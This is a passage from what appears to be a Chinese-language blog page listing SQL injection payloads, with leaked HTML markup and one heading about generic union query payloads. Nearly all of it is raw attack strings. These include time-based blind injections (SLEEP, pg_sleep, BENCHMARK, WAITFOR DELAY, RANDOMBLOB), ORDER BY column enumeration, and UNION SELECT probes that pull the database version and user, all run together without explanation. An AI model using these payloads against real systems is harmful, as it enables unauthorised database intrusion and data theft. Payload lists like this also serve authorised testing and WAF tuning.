benchmark(10000000,MD5(1))#pg_sleep(5)--1 or pg_sleep(5)--&quot; or pg_sleep(5)--&#39; or pg_sleep(5)--1) or pg_sleep(5)--&quot;) or pg_sleep(5)--&#39;) or pg_sleep(5)--1)) or pg_sleep(5)--&quot;)) or pg_sleep(5)--&#39;)) or pg_sleep(5)--AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND &#39;vRxe&#39;&#x3D;&#39;vRxeAND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND &#39;%&#39;&#x3D;&#39;AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#SLEEP(5)#SLEEP(5)--SLEEP(5)&#x3D;&quot;SLEEP(5)&#x3D;&#39;or SLEEP(5)or SLEEP(5)#or SLEEP(5)--or SLEEP(5)&#x3D;&quot;or SLEEP(5)&#x3D;&#39;waitfor delay &#39;00:00:05&#39;waitfor delay &#39;00:00:05&#39;--waitfor delay &#39;00:00:05&#39;#benchmark(50000000,MD5(1))benchmark(50000000,MD5(1))--benchmark(50000000,MD5(1))#or benchmark(50000000,MD5(1))or benchmark(50000000,MD5(1))--or benchmark(50000000,MD5(1))#pg_SLEEP(5)pg_SLEEP(5)--pg_SLEEP(5)#or pg_SLEEP(5)or pg_SLEEP(5)--or pg_SLEEP(5)#&#39;\&quot;AnD SLEEP(5)AnD SLEEP(5)--AnD SLEEP(5)#&amp;&amp;SLEEP(5)&amp;&amp;SLEEP(5)--&amp;&amp;SLEEP(5)#&#39; AnD SLEEP(5) ANd &#39;1&#39;&amp;&amp;SLEEP(5)&amp;&amp;&#39;1ORDER BY SLEEP(5)ORDER BY SLEEP(5)--ORDER BY SLEEP(5)#(SELECT * FROM (SELECT(SLEEP(5)))ecMj)(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--+benchmark(3200,SHA1(1))+&#39;+ SLEEP(10) + &#39;RANDOMBLOB(500000000&#x2F;2)AND 2947&#x3D;LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(500000000&#x2F;2))))OR 2947&#x3D;LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(500000000&#x2F;2))))RANDOMBLOB(1000000000&#x2F;2)AND 2947&#x3D;LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(1000000000&#x2F;2))))OR 2947&#x3D;LIKE(&#39;ABCDEFG&#39;,UPPER(HEX(RANDOMBLOB(1000000000&#x2F;2))))SLEEP(1)&#x2F;*&#39; or SLEEP(1) or &#39;&quot; or SLEEP(1) or &quot;*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-通用联合查询有效负载"><a href="#0x04-通用联合查询有效负载" class="headerlink" title="0x04 通用联合查询有效负载"></a>0x04 通用联合查询有效负载</h2><pre class="line-numbers language-none"><code class="language-none">ORDER BY SLEEP(5)ORDER BY 1,SLEEP(5)ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;))ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30ORDER BY SLEEP(5)#ORDER BY 1,SLEEP(5)#ORDER BY 1,SLEEP(5),3#ORDER BY 1,SLEEP(5),3,4#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#ORDER BY SLEEP(5)-- ORDER BY 1,SLEEP(5)-- ORDER BY 1,SLEEP(5),3-- ORDER BY 1,SLEEP(5),3,4-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5(&#39;A&#39;)),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION ALL SELECT 1UNION ALL SELECT 1,2UNION ALL SELECT 1,2,3UNION ALL SELECT 1,2,3,4UNION ALL SELECT 1,2,3,4,5UNION ALL SELECT 1,2,3,4,5,6UNION ALL SELECT 1,2,3,4,5,6,7UNION ALL SELECT 1,2,3,4,5,6,7,8UNION ALL SELECT 1,2,3,4,5,6,7,8,9UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30UNION ALL SELECT 1#UNION ALL SELECT 1,2#UNION ALL SELECT 1,2,3#UNION ALL SELECT 1,2,3,4#UNION ALL SELECT 1,2,3,4,5#UNION ALL SELECT 1,2,3,4,5,6#UNION ALL SELECT 1,2,3,4,5,6,7#UNION ALL SELECT 1,2,3,4,5,6,7,8#UNION ALL SELECT 1,2,3,4,5,6,7,8,9#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#UNION ALL SELECT 1-- UNION ALL SELECT 1,2-- UNION ALL SELECT 1,2,3-- UNION ALL SELECT 1,2,3,4-- UNION ALL SELECT 1,2,3,4,5-- UNION ALL SELECT 1,2,3,4,5,6-- UNION ALL SELECT 1,2,3,4,5,6,7-- UNION ALL SELECT 1,2,3,4,5,6,7,8-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- UNION SELECT @@VERSION,SLEEP(5),3UNION SELECT @@VERSION,SLEEP(5),USER(),4UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30UNION SELECT @@VERSION,SLEEP(5),&quot;&#39;3UNION SELECT @@VERSION,SLEEP(5),&quot;&#39;3&#39;&quot;#UNION SELECT @@VERSION,SLEEP(5),USER(),4#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16#UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5(&#39;A&#39;)),5,6,7,8,9,10,11,12,13,14,15,16,17#UNION SELECT 